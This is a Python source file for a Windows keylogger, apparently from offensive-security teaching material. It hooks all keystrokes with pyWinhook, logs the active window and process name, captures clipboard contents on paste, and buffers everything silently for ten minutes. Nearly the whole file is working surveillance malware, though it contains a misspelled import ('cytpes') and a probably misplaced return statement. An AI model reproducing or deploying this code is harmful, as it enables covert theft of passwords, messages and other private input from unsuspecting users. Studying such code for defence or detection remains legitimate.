from cytpes import byref, create_string_buffer, c_ulong, windll
from io     import StringIO

import os
import pythoncom
import pyWinhook as pyHook # PyWinHook is a fork of the original PyHook 
import sys
import time
import win32clipboard

TIMEOUT = 60*10

class KeyLogger:
    def __init__(self):
        self.current_window = None
    
    def get_current_process(self):
        ''' Captures the active window and its associated process ID '''
        # Call GetForeGroundWindow to return a handle to the active desktop window
        hwnd = windll.user32.GetForegroundWindow()
        pid  = c_ulong(0)
        # we pass the handle to GetWindowThreadProcessId 
        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
        process_id = f'{pid.value}'

        executable = create_string_buffer(512)
        # Open the process
        h_process  = windll.kernel32.OpenProcess(0x400|0x10, False, pid)
        # Finds the executable name of the process
        windll.psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)
        
        window_title = create_string_buffer(512)
        # Grabs the full text of the window's title bar
        windll.user32.GetWindowTextA(hwnd, byref(window_title), 512)
        try:
            self.current_window = window_title.value.decode()
        except UnicodeDecodeError as e:
            print(f'{e}: window name unknown')

        # Create a header: Process ID | Keystrokes | Window 
        print('\n', process_id, executable.value.decode(), self.current_window)

        windll.kernel32.CloseHandle(hwnd)
        windll.kernel32.CloseHandle(h_process)
    
    def mykeystroke(self, event):
        if event.WindowName != self.current_window:
            self.get_current_process()
        # prints the keystroke unless its a modifier
        if 32 < event.Ascii < 127:
            print(chr(event.Ascii), end='')
        else:
            # Check if it is a PASTE operation
            if event.Key == 'V':
                win32clipboard.OpenClipboard()
                value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                print(f'[PASTE] - {value}')
            else:
                print(f'{event.Key}')
            return True
    
def run():
    save_stdout = sys.stdout
        # Switch stdout to a file-like object for later queries
    sys.stdout  = StringIO()

    kl         = KeyLogger()
    # Takes advantage of Windows function SetWindowsHookEx to install user-defined functions to be called for cetain events
    hm         = pyHook.HookManager()
    hm.KeyDown = kl.mykeystroke
    # Hook all keypresses
    hm.HookKeyboard()
    while time.thread_time() < TIMEOUT:
        pythoncom.PumpWaitingMessages()
    log = sys.stdout.getvalue()
    sys.stdout = save_stdout
    return log

if __name__ == '__main__':
    print(run())
    print('done.')
